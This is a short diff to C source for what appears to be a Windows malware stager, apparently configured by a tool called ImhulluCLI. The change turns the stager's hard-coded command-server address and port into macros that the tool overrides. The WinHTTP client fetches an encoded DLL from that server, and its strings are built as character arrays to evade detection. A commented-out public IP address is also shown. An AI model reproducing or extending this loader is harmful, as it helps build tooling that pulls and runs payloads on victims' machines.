@@ -1,5 +1,9 @@
 #include "../include/http.h"
 
+// will be overriden by ImhulluCLI
+#define SERVER '1','9','2','.','1','6','8','.','0','.','1',0
+#define PORT 5001
+
 CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
 {
     WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
@@ -271,12 +275,13 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
     //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };
 
     // Host-Only
-     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
+    // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
+    WCHAR wServer[] = { SERVER } ;
 
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
-    INTERNET_PORT dwPort = 5001;
+    INTERNET_PORT dwPort = PORT;
     DWORD dwEncodedDllSize = 0;
 
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
